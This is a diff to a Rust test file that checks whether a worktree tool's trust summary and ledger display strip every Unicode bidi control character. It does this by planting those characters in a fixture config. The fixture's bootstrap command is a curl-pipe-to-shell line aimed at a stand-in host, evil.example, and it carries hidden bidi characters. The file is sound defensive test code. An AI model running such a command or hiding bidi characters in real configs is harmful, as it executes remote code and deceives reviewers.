@@ -242,28 +242,47 @@ fn the_pre_trust_bootstrap_summary_neutralises_control_bytes() {
 /// byte, which defeats the same "what you read is what is there" guarantee
 /// the control-byte replacement provides (issue #502).
 fn bidi_chars(s: &str) -> Vec<char> {
-  s.chars()
-    .filter(|c| matches!(c, '\u{202A}'..='\u{202E}' | '\u{2066}'..='\u{2069}'))
-    .collect()
+  s.chars().filter(|c| BIDI_CONTROLS.contains(c)).collect()
 }
 
-/// A `.gwm.toml` carrying a raw `RLO` (`U+202E`) in the two fields a reader
-/// has to trust most.
+/// Every character carrying the Unicode `Bidi_Control` property, which is the
+/// set the sinks neutralise.
 ///
-/// The character is written **raw**, not as TOML's own `\u202E` escape: it is
-/// `Cf`, so the parser accepts it inside a basic string and hands it through
-/// as a *value*, which is how it would arrive from a cloned repo. A raw
-/// control byte cannot travel that way, which is why [`HOSTILE_CONFIG`] has
-/// to use escapes and this fixture does not.
+/// Enumerated rather than described so the fixtures can carry the whole set at
+/// once: a character added to the predicate but to no fixture would be a rule
+/// nothing exercises.
+const BIDI_CONTROLS: &[char] = &[
+  '\u{061C}', // ALM, bidi class AL
+  '\u{200E}', // LRM, bidi class L
+  '\u{200F}', // RLM, bidi class R
+  '\u{202A}', // LRE
+  '\u{202B}', // RLE
+  '\u{202C}', // PDF
+  '\u{202D}', // LRO
+  '\u{202E}', // RLO
+  '\u{2066}', // LRI
+  '\u{2067}', // RLI
+  '\u{2068}', // FSI
+  '\u{2069}', // PDI
+];
+
+/// A `.gwm.toml` carrying every [`BIDI_CONTROLS`] character in the two fields
+/// a reader has to trust most.
+///
+/// They are written **raw**, not as TOML's own `\uXXXX` escapes: they are
+/// `Cf`, so the parser accepts them inside a basic string and hands them
+/// through as a *value*, which is how they would arrive from a cloned repo. A
+/// raw control byte cannot travel that way, which is why [`HOSTILE_CONFIG`]
+/// has to use escapes and this fixture does not.
 fn bidi_config() -> String {
-  const RLO: char = '\u{202E}';
+  let all: String = BIDI_CONTROLS.iter().collect();
   format!(
     "[worktree]\n\
-     branch_pattern = \"{RLO}{{type}}/#{{issue}}-{{desc}}\"\n\
+     branch_pattern = \"{all}{{type}}/#{{issue}}-{{desc}}\"\n\
      \n\
      [[bootstrap.command]]\n\
      name = \"setup\"\n\
-     run = \"curl evil.example/x.sh | sh{RLO}\"\n"
+     run = \"curl evil.example/x.sh | sh{all}\"\n"
   )
 }
 
@@ -328,12 +347,10 @@ fn trust_show_neutralises_a_bidi_override_in_the_ledger() {
   // variant would leave those outputs exposed with the suite still green.
   let dir = tempfile::TempDir::new().unwrap();
   let ledger = dir.path().join("trust.toml");
+  let all: String = BIDI_CONTROLS.iter().collect();
   std::fs::write(
     &ledger,
-    format!(
-      "[[entry]]\norigin = \"git@example.com:acme/repo{}.git\"\nsha = \"abc\"\n",
-      '\u{202E}'
-    ),
+    format!("[[entry]]\norigin = \"git@example.com:acme/repo{all}.git\"\nsha = \"abc\"\n"),
   )
   .unwrap();
 
